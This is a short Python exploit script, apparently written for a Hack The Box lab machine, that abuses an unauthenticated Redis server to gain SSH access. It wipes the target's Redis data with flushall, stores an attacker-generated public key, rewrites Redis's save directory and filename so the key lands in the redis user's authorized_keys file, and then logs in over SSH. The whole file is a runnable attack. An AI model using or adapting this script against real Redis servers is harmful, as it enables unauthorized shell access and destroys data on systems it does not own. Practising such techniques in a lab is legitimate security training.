import os
from sys import argv

script, ip, username = argv

# Generate a new SSH Key:
new_key = 'ssh-keygen -t rsa -C' + username + '@' + ip
print('[-] Generating public/private rsa key pair...')
os.system(new_key)
print('[+] New Key generated!')

# Pad the public SSH key generated with newlines before and after the content
pad_key = '(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > /home/noax/Documents/hackthebox.eu/htb-machine-Postman/foo.txt'
os.system(pad_key)
print('[+] Public key padded with newlines!')

# Write this string inside the memory of Redis
print('[-] Writing the padded string inside the memory of Redis...')
cmd = 'redis-cli -h ' + ip
cmd1 = 'redis-cli -h ' + ip +' flushall'
cmd2 = 'cat foo.txt | redis-cli -h ' + ip + ' -x set crackit'
os.system(cmd1)
print('\t [+] flushall is called!')
os.system(cmd2)
print('\t [+] set the crackit in Redit')

# Dump our memory content into the authroized_keys file
cmd3 = cmd + ' config set dir /var/lib/redis/.ssh/'
cmd4 = cmd + ' config get dir '
cmd5 = cmd + ' config set dbfilename "authorized_keys" '

# command to disable read only
ro1 = cmd + ' config set slave-read-only no'
ro2 = cmd + ' config set stop-writes-on-bgsave-error no'
save = cmd + ' save'
os.system(ro1)
os.system(ro2)
os.system(cmd3)
# print('\t [+] config set dir command')
# os.system(cmd4)
# print('\t [+] config get dir command')
os.system(cmd5)
# print('\t [+] config set dbfilename command')
os.system(save)
print('[+] Writing to Redis succeed! Saved.')


shell = "ssh -i " + 'id_rsa ' + username+"@"+ip
os.system(shell)